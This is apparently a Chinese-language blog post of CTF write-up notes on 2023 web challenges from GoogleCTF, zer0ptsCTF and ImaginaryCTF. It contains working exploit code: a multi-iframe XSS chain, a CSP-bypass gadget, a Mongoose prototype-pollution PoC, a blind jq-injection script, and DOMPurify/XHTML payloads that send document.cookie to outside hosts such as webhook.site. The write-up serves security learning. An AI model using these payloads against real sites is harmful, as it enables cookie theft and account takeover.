---
title: GoogleCTF + zer0ptsCTF + ImaginaryCTF 2023 筆記
catalog: true
date: 2023-07-28 14:10:44
tags: [Security]
categories: [Security]
photos: /img/google-zer0pts-imaginary-ctf-2023-writeup/cover.png
---

前陣子忙著旅遊，沒什麼時間在打 CTF，就算有打也有點懶得寫 writeup，導致上一篇 writeup 已經是 3 月份的時候了。覺得這樣斷掉其實有點可惜，就趕快再寫一篇補回來。

標題提到的這三個 CTF，我只有打 GoogleCTF 2023，其他兩場都只有稍微看一下題目而已，所以這篇也只是對題目以及解法做個筆記。

關鍵字列表：

1. Flask 跟 PHP 解析 POST data 的順序不一致
2. iframe csp 阻止部分 script 載入
3. HEAD 繞 CSRF
4. location.ancestorOrigins 拿 parent origin
5. iframe 改 location 不會改到 src
6. recaptcha URL 的 Angular CSP bypass gadget
7. document.execCommand('undo'); 還原 input
8. X-HTTP-Method-Override
9. HTML 與 XHTML 的 parser 差異

<!-- more -->

## GoogleCTF 2023

這邊有官方給的完整題目內容跟解法：https://github.com/google/google-ctf/tree/master/2023

### UNDER-CONSTRUCTION (466 solves)

這題的核心程式碼如下：

``` python
@authorized.route('/signup', methods=['POST'])
def signup_post():
    raw_request = request.get_data()
    username = request.form.get('username')
    password = request.form.get('password')
    tier = models.Tier(request.form.get('tier'))

    if(tier == models.Tier.GOLD):
        flash('GOLD tier only allowed for the CEO')
        return redirect(url_for('authorized.signup'))

    if(len(username) > 15 or len(username) < 4):
        flash('Username length must be between 4 and 15')
        return redirect(url_for('authorized.signup'))

    user = models.User.query.filter_by(username=username).first()

    if user:
        flash('Username address already exists')
        return redirect(url_for('authorized.signup'))

    new_user = models.User(username=username, 
        password=generate_password_hash(password, method='sha256'), tier=tier.name)

    db.session.add(new_user)
    db.session.commit()

    requests.post(f"http://{PHP_HOST}:1337/account_migrator.php", 
        headers={"token": TOKEN, "content-type": request.headers.get("content-type")}, data=raw_request)
    return redirect(url_for('authorized.login'))
```

有一個註冊的功能，會檢查 data 中的參數，檢查完以後把 request forward 到 PHP 那邊，而我們的目標是建議一個 tier 為 GOLD 的使用者。

解法是利用 PHP 跟 Flask 對於 POST data 解析的不一致，如果傳 `a=1&a=2` 的話，Flask 在拿 a 的時候會得到 `1`（第一個），而 PHP 會拿到 `2`（最後一個）

因此只要運用這個不一致，就可以在 Flask 那邊建立一個合法的使用者，但是 forward 給 PHP 的時候 tier 變成 GOLD：

```
curl -X POST http://<flask-challenge>/signup -d "username=username&password=password&tier=blue&tier=gold"
```

### BIOHAZARD (14 solves)

這題的功能是可以讓你建立一個 note，而目標是 XSS。

在 render note 的時候，有一個 prototype pollution 的洞，在 render 的時候會先 sanitized：

``` js
goog.require('goog.dom');
goog.require('goog.dom.safe');
goog.require('goog.html.sanitizer.unsafe');
goog.require('goog.html.sanitizer.HtmlSanitizer.Builder');
goog.require('goog.string.Const');

window.addEventListener('DOMContentLoaded', () => {
  var Const = goog.string.Const;
  var unsafe = goog.html.sanitizer.unsafe;
  var builder = new goog.html.sanitizer.HtmlSanitizer.Builder();
  builder = unsafe.alsoAllowTags(
      Const.from('IFRAME is required for Youtube embed'), builder, ['IFRAME']);
  sanitizer = unsafe.alsoAllowAttributes(
      Const.from('iframe#src is required for Youtube embed'), builder,
      [
        {
        tagName: 'iframe',
        attributeName: 'src',
        policy: (s) => s.startsWith('https://') ? s : '',
        }
      ]).build();
});

setInnerHTML = function(elem, html) {
  goog.dom.safe.setInnerHtml(elem, html);
}
```

而這個 sanitizer 可以藉由 prototype pollution 繞過部分限制，你不能用新的 tag，但可以繞過 attribute 的限制，例如說 iframe 原本就允許使用，因此你想用 iframe srcdoc 是可以的

有個麻煩的地方是 CSP 是 `base-uri 'none'; script-src 'nonce-${nonce}' 'strict-dynamic' 'unsafe-eval'; require-trusted-types-for 'script';`，裡面有 trusted types，所以雖然你可以插入 `<img src=x onerror=alert(1)>`，但是背後的 sanitizer 在執行 `img.setAttribute('onerror','alert(1)')` 時就會觸發 trusted types 的錯誤，就掛了。

當初搞了很久都繞不過去，後來有個想法是其實 static 資料夾底下有一堆測試用的 HTML 檔案，如果裡面哪個有 XSS 漏洞的話，其實用個 iframe src 就可以 flag 了，當時有稍微找一下不過沒找到，賽後看到有人確實是用這個解的，用的是這個檔案：https://github.com/shhnjk/closure-library/blob/master/closure/goog/demos/xpc/minimal/index.html

再後來突然發現它載入 JS 是這樣：

``` html
<script src="/static/closure-library/closure/goog/base.js" nonce="i8OeY0yF3xOOTZVZHHBqIg=="></script>
<script src="/static/bootstrap.js" nonce="i8OeY0yF3xOOTZVZHHBqIg=="></script>
<script src="/static/sanitizer.js" nonce="i8OeY0yF3xOOTZVZHHBqIg=="></script>
<script src="/static/main.js" nonce="i8OeY0yF3xOOTZVZHHBqIg=="></script>
```

其中有個叫做 editor 的變數是定義在 `bootstrap.js`，然後會在 `main.js` 裡面作為 script src 載入腳本，如果我們用 iframe csp 擋住 `bootstrap.js` 的載入，然後再搭配污染 Object.prototype.editor，就可以載入任意 JS。

而這也確實是 intended solution。

當初是在 [Intigriti’s November XSS challenge](https://github.com/aszx87410/ctf-writeups/issues/48) 學到這招的，把 CSP 變嚴格來阻止某些 script 的載入。

### VEGGIE SODA (13 solves)

這題賽中的時候隊友一個人把它解開了，完全沒看。

賽後看了一下官方解法，第一關是用 HEAD 來繞過 CSRF 的保護，這個好像也是滿常用的技巧，第二關看起來跟去年的 [HORKOS](https://blog.huli.tw/2022/07/09/google-ctf-2022-writeup/#horkos-10-solves) 有點像，就一樣是 JS 反序列化的漏洞，找到 gadget chain 就可以利用然後拿到 XSS。

貼一下官方解法連結：https://github.com/google/google-ctf/tree/master/2023/web-vegsoda

### POSTVIEWER V2 (7 solves)

其實就是這題讓我一直逃避寫 writeup，很像電影全面啟動（inception），一層又一層，複雜到我到後面都不知道自己在幹嘛了。

雖然叫做 V2，但其實本質跟去年的題目差滿多的。

先來看重點，重點在這一段：

``` js
async function previewIframe(body, mimeType, shimUrl, container, sandbox = ['allow-scripts']) {
    const url = new URL(shimUrl);
    url.host = `sbx-${generateRandomPart()}.${url.host}`;
    url.searchParams.set('o', window.origin);

    var iframe = document.createElement('iframe');
    iframe.src = url;
    container.appendChild(iframe);
    iframe.addEventListener('load', () => {
        iframe.contentWindow?.postMessage({ body, mimeType, sandbox}, url.origin);
    }, { once: true });
}
```

這邊會新增一個 random 的 sbx domain 的 iframe，然後把 flag 透過 postMessage 傳過去，而這個 sbx domain 的內容也很簡單：

``` js
const TRUSTED_ORIGIN = new URL(location.href).searchParams.get('o');
if(!/^https?:\/\//.test(TRUSTED_ORIGIN)) {
    throw new Error("Untrusted Origin");
}else{
    const DEFAULT_STYLE = 'position:absolute; top:0; left:0; bottom:0; right:0; width:100vw; height:100vh; border:none; margin:0; padding:0; z-index:999999;'
    window.onmessage = (e) => {
        const forbidden_sbx = /allow-same-origin/ig;
        if(e.origin !== TRUSTED_ORIGIN){
            throw new Error("Wrong origin");
        }
        if (e.data.body === undefined || !e.data.mimeType) {
            throw new Error("No content to render");
        };
    
        const blob = new Blob([e.data.body], {
            type: e.data.mimeType
        });

        const iframe = document.createElement('iframe');
        iframe.style.cssText = DEFAULT_STYLE;
        document.body.appendChild(iframe);
        iframe.setAttribute('sandbox', '');

        if(e.data.sandbox){
            for(const value of e.data.sandbox){
                if(forbidden_sbx.test(value) || !iframe.sandbox.supports(value)){
                    console.error(`Unsupported value: ${value}`);
                    continue;
                }
                iframe.sandbox.add(value);
            }
        }
        
        iframe.src = URL.createObjectURL(blob);
        document.body.appendChild(iframe);
        window.onmessage = null;
        e.source.postMessage('blob loaded', e.origin);
    };
}
```

會把收到的內容變成 blob，然後再弄一個 sandbox iframe 放進去，而我們的目標是偷到這個 iframe 裡面的內容。

而最麻煩的點還有幾個：

1. admin bot 有限制，這題不能新開視窗，任何跟 `window.open` 類似的功能都不能用
2. 主 domain 的 CSP 是：`frame-ancestors *.postviewer2-web.2023.ctfcompetition.com; frame-src *.postviewer2-web.2023.ctfcompetition.com`
3. sbx domain 的 CSP 是：`frame-src blob:`

首先呢，我們可以很輕鬆地拿到任何一個 sbx domain 的 XSS，像這樣：

``` js
iframe = document.createElement("iframe")
url = new URL("https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html");
url.searchParams.set('o', window.origin);
iframe.src = url

iframe.addEventListener('load', () => {
    iframe.contentWindow.postMessage({body:"<script>alert(document.domain)</script>", mimeType: "text/html", sandbox: ["allow-modals","allow-scripts",["allow-same-origin"],["allow-same-origin"]]}, "*")
}, { once: true });
document.body.appendChild(iframe);
```

好，問題來了，接下來可以做什麼？

我們的第一步應該是要想辦法把主 domain 弄到 iframe 裡面去，才能做後續操作，但問題是 sbx domain 只允許嵌入 `blob:` 開頭的頁面，這怎麼辦呢？

此時我們想到了可以利用 cookie bomb，把 sbx domain 弄成 `HTTP/2 413 Request Entity Too Large`，這樣的錯誤頁面就沒有了 CSP。

所以流程是：

1. 先載入我們自己的網頁
2. 嵌入一個 sbx iframe，拿到 XSS
3. 從 sbx iframe 寫入 cookie，讓 /bomb 路徑無法載入
4. 再新增一個 iframe 是 /bomb，這個頁面沒有 CSP
5. 從第二步的 iframe 可以直接改寫第四步的 iframe 的內容，拿到一個沒有 CSP 的 XSS
6. 接下來就可以在 iframe 裡面再嵌入 main domain

一直到第五步都是對的，但第六步是錯的，雖然現在沒了 `frame-src blob:` 的限制，但是 main domain 的 `frame-ancestors *.postviewer2-web.2023.ctfcompetition.com;` 是指所有的 parent page，所以只要我們的 top-level page 是自己的，就繞不過 CSP。

接著我突然想到可以利用 blob，像這樣：

``` js
const blob = new Blob(['<h1>hello</h1><iframe src="http://127.0.0.1:5000/test"></iframe>'], {
    type: 'text/html'
});
url = URL.createObjectURL(blob)
console.log(url)
location = url
```

這樣就可以讓 top-level domain 是 `sbx-xxx.postviewer2-web.2023.ctfcompetition.com`，符合了 CSP。

不過在嘗試的時候出現了錯誤：

> Unsafe attempt to initiate navigation for frame with origin 'http://localhost:3000/' from frame with URL 'blob:https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/a15c526d-a65b-45ba-b99f-293595eb8818'. The frame attempting to navigate the top-level window is cross-origin and either it or one of its ancestors is not allowed to navigate the top frame.

後來隊友發現 iframe 補上 sandbox 就可以了：`frame.sandbox = 'allow-modals allow-scripts allow-top-navigation allow-same-origin'`，這也是滿值得紀錄的一個行為，我以為沒有 sandbox 的權限會更大，沒想到加上 sandbox 才可以？

所以這時候的流程就變成：

1. 先載入我們自己的網頁
2. 嵌入一個 sbx iframe(f1)，拿到 XSS
3. 從 frame1 寫入 cookie，讓 /bomb 路徑無法載入
4. 再新增一個 iframe 是 /bomb(f2)，這個頁面沒有 CSP
5. 再新增一個 iframe f3 來執行操作
6. 從 f3 改寫 f2 的 HTML，寫入的 script 會新增一個 blob html 然後改變 top.location
7. 成功載入 blob 並且沒有任何 CSP
8. 在 blob 頁面載入 main domain iframe

此時的 exploit 就已經 100 行了而且超複雜：

``` html
<body></body>
<script>
  const sleep = ms => new Promise(r => setTimeout(r, ms))

  function createBombFrame() {

    let bombFrame = document.createElement("iframe")
    url = new URL("https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html");
    url.searchParams.set('o', window.origin);
    bombFrame.src = url

    bombFrame.addEventListener('load', () => {
      console.log('bombFrame created')
      bombFrame.contentWindow.postMessage({
        body: `
          <script>
            const domain = document.domain
            const cookieCount = 10
            const cookieLength = 3000
            const expireAfterMinute = 5
            setCookieBomb()

            function setCookie(key, value) {
              const expires = new Date(+new Date() + expireAfterMinute * 60 * 1000);
              const v = key + '=' + value + '; path=/bomb; domain=' + domain + '; Secure; SameSite=None; expires=' + expires.toUTCString()
              parent.document.cookie = v
            }

            function setCookieBomb() {
              const value = 'Boring' + '_'.repeat(cookieLength)
              for (let i=0; i<cookieCount; i++) {
                setCookie('key' + i, value);
              }
            }
          <\/script>`,
        mimeType: "text/html", sandbox: ["allow-modals", "allow-scripts", ["allow-same-origin"], ["allow-same-origin"]]
      }, "*")
    }, { once: true });
    document.body.appendChild(bombFrame)
  }

  function createBrokenFrame() {
    return new Promise(resolve => {
      let brokenFrame = document.createElement("iframe")
      url = 'https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/bomb'
      brokenFrame.src = url
      brokenFrame.sandbox = 'allow-modals allow-scripts allow-top-navigation allow-same-origin'
      brokenFrame.addEventListener('load', () => {
        console.log('brokenFrame loaded')
        resolve()
      }, { once: true });
      brokenFrame.addEventListener('error', (e) => {
        console.log('brokenFrame error', e)
        resolve()
      }, { once: true });
      document.body.appendChild(brokenFrame)
    })
  }

  function createXssFrame() {
    console.log('createXssFrame')
    window.xssFrame = document.createElement("iframe")
    url = new URL("https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html");
    url.searchParams.set('o', window.origin);
    xssFrame.src = url
    xssFrame.sandbox = 'allow-modals allow-scripts allow-top-navigation allow-same-origin'
    xssFrame.name = `
            const blob = new Blob(['<html><head><script src="YOUR PAYLOAD HERE" /><script>alert(1)</scr' + 'ipt></head><body><div /></body></html>'], {
                type: 'text/html'
            });
            url = URL.createObjectURL(blob)
            console.log(url)
            window.top.location = url
    `;

    xssFrame.addEventListener('load', () => {
      console.log('xss frame loaded')

      window.xssFrame.contentWindow.postMessage({
        body: `
          <script>
            top.frames[1].document.open()
            console.log('writing');
            console.log('<script>' + window.parent.name + '</scr' + 'ipt>');
            top.frames[1].document.write('<script>' + window.parent.name + '</scr' + 'ipt>')
          <\/script>`, mimeType: "text/html", sandbox: ["allow-modals", "allow-scripts", "allow-top-navigation", ["allow-same-origin"], ["allow-same-origin"]]
      }, "*")
    }, { once: true });
    document.body.appendChild(xssFrame)
  }

  async function main() {
    createBombFrame()
    console.log("sleeping")
    await sleep(2000)
    console.log("creating broken frame")
    await createBrokenFrame()
    createXssFrame()
  }

  window.addEventListener('message', e => {
    console.log('got message', e, window.location.toString());
  })

  window.addEventListener('load', () => {
    main();
  })
</script>
```

重點是做這個多事情，就只是為了把 main domain 作為 iframe 載入，就這樣而已。

而再來就卡關了，原因是沒辦法繞過這一段：

``` js
async function previewIframe(body, mimeType, shimUrl, container, sandbox = ['allow-scripts']) {
    const url = new URL(shimUrl);
    url.host = `sbx-${generateRandomPart()}.${url.host}`;
    url.searchParams.set('o', window.origin);

    var iframe = document.createElement('iframe');
    iframe.src = url;
    container.appendChild(iframe);
    iframe.addEventListener('load', () => {
        iframe.contentWindow?.postMessage({ body, mimeType, sandbox}, url.origin);
    }, { once: true });
}
```

我們不知道那個 random domain 是什麼，所以沒辦法 postMessage，會被檢查擋住。如果能知道 random domain 的話就好辦了。

接著找了一堆 spec，看了 Chromium source code 跟 bug tracker，但還是沒什麼進展。最多就是找到這個：[Issue 1359122: Security: SOP bypass leaks navigation history of iframe from other subdomain if location changed to about:blank](https://bugs.chromium.org/p/chromium/issues/detail?id=1359122&q=subdomain%20host%20leak&can=1)，雖然就是我們要的但是已經修復了。

一直到比賽結束前十分鐘，隊友找到了 [location.ancestorOrigins](https://developer.mozilla.org/en-US/docs/Web/API/Location/ancestorOrigins) 這屬性，我才知道原來 child iframe 可以拿到 ancestor 的 origin，之前從來沒發現過（儘管它就在 location 的第一個屬性...）

時機限制的關係最後沒做出來，就差最後幾步而已了。

再來的步驟是把那個有 flag 的 blob iframe 導到我們準備好的 blob page，可以用 `location.ancestorOrigins` leak 出 sandbox domain：

```js
top[0][0][0].location = URL.createObjectURL(new Blob(['<script>top.postMessage(location.ancestorOrigins[0],"*")<\/script>'], { type: 'text/html' }));
```

再來我們知道了 sandbox domain 以後，就可以在這個 domain 上拿到 XSS，拿到了 XSS 以後，就可以存取 sandbox domain，此時雖然 iframe 的 location 已經變了，但是 iframe 的 src 不會換，所以可以直接拿到有 flag 的 blob src，拿到之後只要 fetch 就可以取得 flag：

``` js
fetch(top[0][0].document.querySelector('iframe').src)
```

當初如果多個一兩個小時應該就可以做出來了，殘念。

最後附一下作者 exploit，滿值得學習的：https://github.com/google/google-ctf/blob/master/2023/web-postviewer2/solution/solve.html

### NOTENINJA (3 solves)

這題基本上可以插入任意 HTML 但重點是 CSP：`script-src 'self' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/;`

原本以為這題用了 Next.js，會是跟之前 [corCTF 2022](https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/) 很像的做法，但試了很久都沒弄出來，賽後才知道原來這題就只是找到 recaptcha 的 CSP gadget...

在 recaptcha 網站裡面有個 angular 可以拿來當作 gadget，因此最後的解法是：

``` html
++++++++++++++++++++++++++++++++++++++
<div
  ng-controller="CarouselController as c"
  ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
++++++++++++++++++++++++++++++++++++++
```

也算是學到一個比較少人知道的 CSP bypass 了

然後有另一支隊伍直接找到了一個 Mongoose 的 0day：[Mongoose Prototype Pollution Vulnerability in automattic/mongoose](https://huntr.dev/bounties/1eef5a72-f6ab-4f61-b31d-fc66f5b4b467/)

原因在程式碼的這一行：https://github.com/google/google-ctf/blob/master/2023/web-noteninja/challenge/src/pages/api/notes/%5Bid%5D.js#L74

``` js
await Note.findByIdAndUpdate(id, { ...req.body, htmlDescription: htmlDescription });
```

直接把整個 body 吃進去，然後就可以透過 `$rename` 弄出一個 prototype pollution：

``` js
import { connect, model, Schema } from 'mongoose';

await connect('mongodb://127.0.0.1:27017/exploit');

const Example = model('Example', new Schema({ hello: String }));

const example = await new Example({ hello: 'world!' }).save();
await Example.findByIdAndUpdate(example._id, {
    $rename: {
        hello: '__proto__.polluted'
    }
});

// this is what causes the pollution
await Example.find();

const test = {};
console.log(test.polluted); // world!
console.log(Object.prototype); // [Object: null prototype] { polluted: 'world!' }

process.exit();
```

透過這個 prototype pollution 的洞，可以讓 `find()` dump 出所有的資料，就可以看到其他人的 note。

## zer0ptsCTF 2023

先補幾個 reference：

1. [zer0pts CTF writeup (in English)](https://nanimokangaeteinai.hateblo.jp/entry/2023/07/17/101119)
2. [zer0pts CTF 2023 writeup (4 web challs)](https://blog.arkark.dev/2023/07/17/zer0pts-ctf/)
3. [zer0pts CTF 2023 Writeups](https://blog.maple3142.net/2023/07/16/zer0pts-ctf-2023-writeups/)

每題的完整程式碼都在這裡：https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/web

### Warmuprofile (48 solves)

這題滿有趣的，你可以新增跟刪除使用者，目標是建立一個 admin user，但是 admin 已經存在了，所以要想辦法把它刪掉。

刪除的程式碼如下：

``` js
app.post('/user/:username/delete', needAuth, async (req, res) => {
    const { username } = req.params;
    const { username: loggedInUsername } = req.session;
    if (loggedInUsername !== 'admin' && loggedInUsername !== username) {
        flash(req, 'general user can only delete itself');
        return res.redirect('/');
    }

    // find user to be deleted
    const user = await User.findOne({
        where: { username }
    });

    await User.destroy({
        where: { ...user?.dataValues }
    });

    // user is deleted, so session should be logged out
    req.session.destroy();
    return res.redirect('/');
});
```

如果仔細看仔細想的話，會發現這邊有個問題。

那就是如果你同時開兩個 tab 登入，那兩個 session 的 username 都會有東西，接著在其中一個頁面刪除使用者，刪完以後另外一個也做相同操作。

此時 `User.findOne` 會因為資料庫裡面已經沒有這個使用者而回傳 `null`，執行到 `User.destroy` 時就會變成 `where: {}`，變成刪除資料庫裡面所有的東西，就可以把 admin 給刪掉。

### jqi (40 solves)

這題你設定條件以後會執行相對應的 jq 指令，我也是看到這題才發現原來 jq 這麼多功能。

最主要的程式碼是這一段：

``` js
const KEYS = ['name', 'tags', 'author', 'flag'];
fastify.get('/api/search', async (request, reply) => {
    const keys = 'keys' in request.query ? request.query.keys.toString().split(',') : KEYS;
    const conds = 'conds' in request.query ? request.query.conds.toString().split(',') : [];

    if (keys.length > 10 || conds.length > 10) {
        return reply.send({ error: 'invalid key or cond' });
    }

    // build query for selecting keys
    for (const key of keys) {
        if (!KEYS.includes(key)) {
            return reply.send({ error: 'invalid key' });
        }
    }
    const keysQuery = keys.map(key => {
        return `${key}:.${key}`
    }).join(',');

    // build query for filtering results
    let condsQuery = '';

    for (const cond of conds) {
        const [str, key] = cond.split(' in ');
        if (!KEYS.includes(key)) {
            return reply.send({ error: 'invalid key' });
        }

        // check if the query is trying to break string literal
        if (str.includes('"') || str.includes('\\(')) {
            return reply.send({ error: 'hacking attempt detected' });
        }

        condsQuery += `| select(.${key} | contains("${str}"))`;
    }

    let query = `[.challenges[] ${condsQuery} | {${keysQuery}}]`;
    console.log('[+] keys:', keys);
    console.log('[+] conds:', conds);
    console.log(query)

    let result;
    try {
        result = await jq.run(query, './data.json', { output: 'json' });
    } catch(e) {
        console.log(e)
        return reply.send({ error: 'something wrong' });
    }

    if (conds.length > 0) {
        reply.send({ error: 'sorry, you cannot use filters in demo version' });
    } else {
        reply.send(result);
    }
});
```

雖然說有擋雙引號但沒擋 `\`，因此只要兩個條件配合，就可以插入自己的 jq command，達成 command injection，用 `env.FLAG` 可以拿到 flag。

不過問題是不會把結果傳回來，所以是 blind injection，一個一個字元慢慢 leak 就行了，底下貼的是 [zer0pts CTF 2023 writeup (4 web challs)](https://blog.arkark.dev/2023/07/17/zer0pts-ctf/) 的 exploit：

``` js
import httpx
import string

# BASE_URL = "http://localhost:8300"
BASE_URL = "http://jqi.2023.zer0pts.com:8300"

CHARS = "}_" + string.ascii_letters + string.digits


def make_str(xs: str) -> str:
    return "(" + "+".join([f"([{ord(x)}] | implode)" for x in xs]) + ")"


def is_ok(prefix: str) -> bool:
    res = httpx.get(
        f"{BASE_URL}/api/search",
        params={
            "keys": "name",
            "conds": ",".join([
                "\\ in name",
                f"))] + [if (env.FLAG | startswith({make_str(prefix)})) then error({make_str('x')}) else 0 end] # in name"
            ]),
        },
    )
    return res.json()["error"] == "something wrong"


known = "zer0pts{"
while not known.endswith("}"):
    for c in CHARS:
        if is_ok(known + c):
            known += c
            break
    print(known)
print("Flag: " + known)
```

### Neko Note (26 solves)

又是一個經典 note app，核心程式碼如下：

``` go
var linkPattern = regexp.MustCompile(`\[([0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[0-9a-f]{4}-[0-9a-f]{12})\]`)

// replace [(note ID)] to links
func replaceLinks(note string) string {
  return linkPattern.ReplaceAllStringFunc(note, func(s string) string {
    id := strings.Trim(s, "[]")

    note, ok := notes[id]
    if !ok {
      return s
    }

    title := html.EscapeString(note.Title)
    return fmt.Sprintf(
      "<a href=/note/%s title=%s>%s</a>", id, title, title,
    )
  })
}

// escape note to prevent XSS first, then replace newlines to <br> and render links
func renderNote(note string) string {
  note = html.EscapeString(note)
  note = strings.ReplaceAll(note, "\n", "<br>")
  note = replaceLinks(note)
  return note
}
```

sanitized 之後會 replace link，這邊雖然也有 escaped，但因為屬性沒有用引號包住所以可以注入任意屬性到 a 裡面。

這邊用 `onanimationend` 或是 `onfocus` 似乎都可以觸發 XSS。

這邊觸發 XSS 以後還有個步驟，那就是要偷的東西被刪掉了，但可以用神奇的 `document.execCommand('undo');` 將其復原。

### ScoreShare (16 solves)

這題的核心程式碼如下：

``` python
@app.route("/", methods=['GET', 'POST'])
def upload():
    if flask.request.method == 'POST':
        title = flask.request.form.get('title', '')
        abc = flask.request.form.get('abc', None)
        link = flask.request.form.get('link', '')
        if not title:
            flask.flash('Title is empty')
        elif not abc:
            flask.flash('ABC notation is empty')
        else:
            sid = os.urandom(16).hex()
            db().hset(sid, 'title', title)
            db().hset(sid, 'abc', abc)
            db().hset(sid, 'link', link)
            return flask.redirect(flask.url_for('score', sid=sid))
    return flask.render_template("upload.html")

@app.route("/score/<sid>")
def score(sid: str):
    """Score viewer"""
    title = db().hget(sid, 'title')
    link = db().hget(sid, 'link')
    if link is None:
        flask.flash("Score not found")
        return flask.redirect(flask.url_for('upload'))
    return flask.render_template("score.html", sid=sid, link=link.decode(), title=title.decode())

@app.route("/api/score/<sid>")
def api_score(sid: str):
    abc = db().hget(sid, 'abc')
    if abc is None:
        return flask.abort(404)
    else:
        return flask.Response(abc)
```

你可以新增一個 post 之類的，然後有個 unintended 是 `/api/score/<sid>` 這個 endpoint 會直接把 abc 整個吐出來，所以新增兩個，一個是 JS 內容，另一個是 `<script src=...>` 就可以直接 XSS 了。

預期解可以參考作者的文章：[zer0pts CTF 2023 Writeup](https://ptr-yudai.hatenablog.com/#ScoreShare)，透過 iframe DOM clobbering 再搭配原有的功能達成 prototype pollution，然後找到 ABCJS 的 gadget。

### Ringtone (14 solves)

這題有點小複雜，簡單記一下就好，就是可以透過 DOM clobbering 拿到一個在 Chrome extension context 的 XSS，接著用 `chrome.history.search` 可以拿到 flag URL，就可以去拿 flag。

作者 writeup：[Ringtone Web Challenge Writeup - Zer0pts CTF 2023](https://ahmed-belkahla.me/post/zer0ptsctf2023/)

### Plain Blog (14 solves)

這題是一個 blog app，你需要有拿 flag 的權限才能拿到 flag，而要有這個權限你的 post 必須有 1_000_000_000_000 以上的 like，但想也知道網站有擋 max like，根本湊不了這麼多。

解法是前端有個 prototype pollution 的洞，透過這個洞去污染 fetch 的參數，放入 `X-HTTP-Method-Override: PUT` 的 header，就可以讓 admin bot 直接去 call 另一隻 API 拿到權限。

## ImaginaryCTF 2023

### Sanitized (5 solves)

這題的程式碼滿簡短的，值得注意的就是 CSP 為 `default-src 'self'`，然後 Express 那邊有個路徑是：

``` js
app.use((req, res) => {
  res.type('text').send(`Page ${req.path} not found`)
})
```

看得出來需要利用這個路徑的 response 作為 script 來執行。

在前端的部分就是很經典的呼叫 DOMPurify：

``` js
const params = new URLSearchParams(location.search)
const html = params.get('html')
if (html) {
  document.getElementById('html').value = html
  document.getElementById('display').innerHTML = DOMPurify.sanitize(html)
}
```

在 `index.xhtml` 裡面載入 main.js 時，是採用相對路徑：`<script src="main.js"></script>`。

我們先來看一下 unintended 的解法，滿有趣的。

非預期解是直接讓 bot 載入這個路徑：`/1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//asd%2f..%2f..%2findex.xhtml#https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?`

這是利用了 RPO（Relative Path Overwrite）來搞事，對後端來說 `%2f` 會被解析為 /，所以這個 URl 就是在載入 `index.xhtml`，沒啥問題。

但是對瀏覽器來說，當前的路徑變為 `1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//`，因此會載入 `/1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//main.js`，而根據 Express 的 route，response 就會是：

```
Page /1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//main.js not found
```

第一句 `Page/1` 因為第二句的 `var [Page]=[1]` 的 hoisting 所以不會發生 variable is not defined 的錯誤，而最後的 `main.js not found` 被前面的 `//` 弄成註解，因此最後就執行了中間那一段，偷到了 cookie。

這操作真的帥氣。

### Sanitized Revenge (3 solves)

這題把 unintended 修掉了，讓我們來看一下預期解。

首先這題最重要的一點在於網頁是 xhtml，而非 html，因此瀏覽器的解析方式會不同。

舉例來說，作者給的 payload：

``` html
<div><div id="url">https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?</div><style><![CDATA[</style><div data-x="]]></style><iframe name='Page' /><base href='/**/+location.assign(document.all.url.textContent+document.cookie)//' /><style><!--"></div><style>--></style></div>
```

會被 HTML parser 解析為 style tag + 一個含有 `data-x` 屬性的 div，所以 DOMPurify 不會做任何事情，這是沒問題的 HTML。

但由於現在在 xhtml 底下，因此 CDATA 那一段就變成了像是註解的東西，刪除後變成：

``` html
<div>
  <div id="url">https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?</div>
  <style></style>
  <iframe name='Page' /><base href='/**/+location.assign(document.all.url.textContent+document.cookie)//' /><style><!--"></div><style>--></style></div>
```

原本在屬性裡的 iframe 跟 base 就跑了出來。

這邊會需要 base 是因為一般來說碰到 `script-src 'self'` 這種 CSP，第一直覺一定是 `<iframe srcdoc>` 搭配 script gadget 去繞，但這題因為 xhtml 的限制在屬性中不能有`<`，所以要利用之後會載入的 `report.js` 搭配 base 去改變路徑。

在[作者 writeup](https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202023/Sanitized%20Revenge) 裡面還有給幾個其他人的解法，每個都滿有趣的。

第一個利用了 HTML 會忽略在 style 裡的 `<!--` 但是 xhtml 不會來創造差異：

``` html
<body>
<style>a { color: <!--}</style>
<img alt="--></style><base href='/(document.location=/http:/.source.concat(String.fromCharCode(47)).concat(String.fromCharCode(47)).concat(/cb6c5dql.requestrepo.com/.source).concat(String.fromCharCode(47)).concat(document.cookie));var[Page]=[1]//x/' />">
</body>
```

第二個則是 DOMPurify 在偵測 mXSS 時會檢查 valid HTML tag，需要是 ASCII alphanumeric，但是 XML 其實允許更多字元：

``` html
a<style><ø:base id="giotino" xmlns:ø="http://www.w3.org/1999/xhtml" href="/**/=1;alert(document.cookie);//" /></style>
```

所以在 HTML context 底下是沒問題的，但是在 xhtml 還是會被解析為是 base tag。

第三個看起來跟第一個類似，但第一個簡單許多，是這樣的：

``` html
ff<style><!--</style><a id="--><base href='/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//'></base><!--"></a><style>&lt;k</style><style>--></style>
```

以 HTML 來說就是一個 style + a tag + 兩個 style tag。但是以 xhtml 來說的話，會把 style 裡的 `<!-- -->` 也看作是註解，因此會變成：

 ``` html
ff<style><base href='/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//'></base></style>
```

從他想達成的效果來看，應該簡化成這樣也可以：

``` html
